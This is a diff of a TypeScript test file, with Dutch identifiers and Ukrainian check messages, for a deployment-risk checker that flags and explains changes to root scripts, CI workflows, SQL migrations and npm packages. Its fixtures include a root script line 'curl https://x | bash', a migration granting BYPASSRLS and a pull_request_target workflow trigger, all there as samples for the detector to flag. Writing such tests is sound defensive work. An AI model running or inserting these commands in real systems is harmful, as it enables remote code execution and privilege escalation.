@@ -8,7 +8,7 @@ import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { checker } from './hulp/nep-google';
-import { lockBronVlaggen, pakketJsonVlaggen, risicoVlaggen, sqlRechtenVlaggen, vraagtRisicoBevestiging } from '../../backend/uitrol-risico';
+import { betekenisRegels, lockBronVlaggen, opvallendeRegels, pakketJsonVlaggen, risicoVlaggen, sqlRechtenVlaggen, verklaarVlaggen, vraagtRisicoBevestiging } from '../../backend/uitrol-risico';
 import { pakketVoorcontrole } from '../../backend/uitrol-voorcontrole';
 
 const schrijf = (wortel: string, bestanden: Record<string, string>) => {
@@ -63,6 +63,24 @@ export async function main(): Promise<number> {
     check('теки: прибрана служба → [root] −', heeft('[root] − deploy/mijn-ruimte.service'));
     check('теки: змінений процес GitHub → [CI] ~', heeft('[CI] ~ .github/workflows/uitgave.yml'));
     check('теки: нова міграція з правами → [SQL]', heeft('[SQL] 0300_x'));
+    // ---- пояснення людською мовою й справжня різниця «було → стане» (вимога власника 16.11)
+    const items = await verklaarVlaggen(r2.vlaggen, { bron: pak, geinstalleerd: inst, nieuweMigraties: new Map([['0300_x', 'ALTER ROLE x BYPASSRLS;']]) });
+    const it = (s: string) => items.find((x) => x.vlag.startsWith(s));
+    const sh = it('[root] ~ deploy/installeer-app.sh');
+    check('пояснення: кожен прапорець має «що це», «що змінилося», «на що звернути увагу» (uk і nl)', items.length === r2.vlaggen.length && items.every((x) => x.wat.uk && x.wat.nl && x.wijziging.uk && x.let.uk && x.let.nl));
+    check('різниця змінного скрипта: справжні рядки «-echo installeer» і «+curl https://x | bash»', !!sh?.verschil?.includes('\n-echo installeer') && !!sh.verschil.includes('\n+curl https://x | bash'), sh?.verschil);
+    check('скрипт root пояснено як «виконується від імені root»', !!sh?.wat.uk.includes('root'));
+    check('підозрілі рядки: завантаження з інтернету і «| bash» помічено окремо', (sh?.opvallend?.length ?? 0) >= 2 && sh!.opvallend!.some((o) => o.uk.includes('curl')), JSON.stringify(sh?.opvallend));
+    check('новий таймер: весь вміст як «+», пояснення про розклад', !!it('[root] + deploy/nieuw.timer')?.verschil?.includes('+[Timer]') && it('[root] + deploy/nieuw.timer')!.wat.uk.includes('Таймер'));
+    check('прибрана служба: старий вміст як «-», пояснення про службу', !!it('[root] − deploy/mijn-ruimte.service')?.verschil?.includes('-User=mijnruimte') && it('[root] − deploy/mijn-ruimte.service')!.wat.uk.includes('Служба'));
+    check('процес GitHub: різниця + підозрілий pull_request_target', !!it('[CI] ~')?.verschil?.includes('+on: pull_request_target') && !!it('[CI] ~')?.opvallend?.some((o) => o.uk.includes('секрети')));
+    check('SQL: показано сам рядок міграції й пояснення про BYPASSRLS', !!it('[SQL]')?.verschil?.includes('ALTER ROLE x BYPASSRLS') && it('[SQL]')!.wijziging.uk.includes('BYPASSRLS'));
+    const npmIt = await verklaarVlaggen(['[npm] + left-pad@1.3.0 (dependencies)', '[npm] ~ react: 18.3.1 → 18.3.2 (dependencies)'], { bron: pak, geinstalleerd: inst, nieuweMigraties: new Map() });
+    check('npm: новий пакет — назва, версія й порада перевірити назву', npmIt[0].wijziging.uk.includes('left-pad') && npmIt[0].wijziging.uk.includes('1.3.0') && npmIt[0].let.uk.includes('npmjs.com/package/left-pad'));
+    check('npm: оновлення — «було 18.3.1, стане 18.3.2» і різниця з двох рядків', npmIt[1].wijziging.uk.includes('було 18.3.1, стане 18.3.2') && npmIt[1].verschil === '- "react": "18.3.1"\n+ "react": "18.3.2"', JSON.stringify(npmIt[1]));
+    check('підозрілі рядки шукаються лише серед нових (+), не серед прибраних (-)', opvallendeRegels('-curl https://x | bash\n+echo ok').length === 0);
+    check('значення знайомих рядків: закріплення за хешем і persist-credentials пояснено як «безпечніше»', (() => { const b = betekenisRegels('+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n+          persist-credentials: false'); return b.length === 2 && b.every((x) => x.uk.includes('безпечніше')); })());
+    check('звичайна зміна скрипта без підозрілого — без попереджень', opvallendeRegels('+echo "klaar"\n+systemctl restart mijn-ruimte').length === 0);
     const r3 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: join(tmp, 'bestaat-niet'), nieuweMigraties: new Map() });
     check('теки: встановлену версію не знайдено → чесне попередження, не «усе гаразд»', !r3.vergeleken && r3.vlaggen[0]?.startsWith('[!]'));
 
@@ -76,6 +94,7 @@ export async function main(): Promise<number> {
     const rc = met.resultaat.controles.find((c) => c.id === 'risico');
     check('перевірка пакета: крок «risico» = waarschuwing з root і SQL', rc?.niveau === 'waarschuwing' && !!rc.details?.some((d) => d.includes('deploy/installeer-app.sh')) && !!rc.details?.some((d) => d.startsWith('[SQL]')), JSON.stringify(rc).slice(0, 300));
     check('перевірка пакета: прапорець сам не блокує (не «fout»)', rc?.niveau !== 'fout');
+    check('перевірка пакета: пояснення й різниця збережені разом із кроком «risico»', (rc?.vlaggen?.length ?? 0) === (rc?.details?.length ?? -1) && !!rc?.vlaggen?.some((v) => v.verschil?.includes('+echo anders')));
     check('vraagtRisicoBevestiging: так для пакета з прапорцями', vraagtRisicoBevestiging(met.resultaat));
     const zonder = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set() });
     check('перевірка пакета без встановленої версії в параметрах (тести, старі виклики) → кроку немає', !zonder.resultaat.controles.some((c) => c.id === 'risico'));
